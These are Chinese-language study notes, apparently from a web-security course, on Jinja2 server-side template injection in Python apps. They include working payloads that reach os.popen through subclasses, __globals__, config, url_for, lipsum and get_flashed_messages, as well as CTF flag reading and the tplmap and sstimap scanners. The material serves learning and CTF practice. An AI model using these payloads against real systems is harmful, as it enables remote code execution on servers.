# WEB攻防-Python安全&SSTI模版注入&Jinja2引擎&利用绕过项目&黑盒检测

## Python-SSTI形成

![image-20260115214038075](images/image-20260115214038075.png)

name的数值是多少就会输出多少

![image-20260115214010916](images/image-20260115214010916.png)

输入JS 就会弹窗

![image-20260115215011346](images/image-20260115215011346.png)

用jinja2 的解析语法

![image-20260115215105146](images/image-20260115215105146.png)

具体的解析语法

![image-20260115215445142](images/image-20260115215445142.png)

**Python-SSTI利用**

1、看那些类可用

{{''.__class__.__base__.__subclasses__()}}

![image-20260116130629418](images/image-20260116130629418.png)

OS是自带的类，popen是引用的方法

****

![image-20260116130800753](images/image-20260116130800753.png)

2、找利用类索引

<class 'os._wrap_close'>

正134行 索引是从0开始的 所以是133

![image-20260116131504328](images/image-20260116131504328.png)

3、找利用类方法

{{''.__class__.__base__.__subclasses__()[133].__init__.__globals__}}

![image-20260116131619292](images/image-20260116131619292.png)

搜索popen

![image-20260116131708166](images/image-20260116131708166.png)

4、构造利用类方法

{{''.__class__.__base__.__subclasses__()[133].__init__.__globals__.popen('calc')}}   弹出计算器

![image-20260116131810826](images/image-20260116131810826.png)

刚才是用数字组现在用列表

![image-20260116131947521](images/image-20260116131947521.png)

其他写法

config：{{config.__class__.__init__.__globals__['os'].popen('calc')}}

url_for：{{url_for.__globals__.os.popen('calc')}}

lipsum：{{lipsum.__globals__['os'].popen('calc')}}

get_flashed_messages：{{get_flashed_messages.__globals__['os'].popen('calc')}}

## 利用.read 读出CTF

![image-20260116133722879](images/image-20260116133722879.png)

参数逃逸

![image-20260116140105095](images/image-20260116140105095.png)

切换传输方式

![image-20260116140803917](images/image-20260116140803917.png)

## 利用tplmap （不推荐）

![image-20260116180008785](images/image-20260116180008785.png)

输入*让它去注入

![image-20260116180037814](images/image-20260116180037814.png)



![image-20260116180120811](images/image-20260116180120811.png)

![image-20260116181637313](images/image-20260116181637313.png)

## 利用sstimap

启动

![image-20260116182527105](images/image-20260116182527105.png)

![image-20260116182657210](images/image-20260116182657210.png)

检测post提交

![image-20260116183012371](images/image-20260116183012371.png)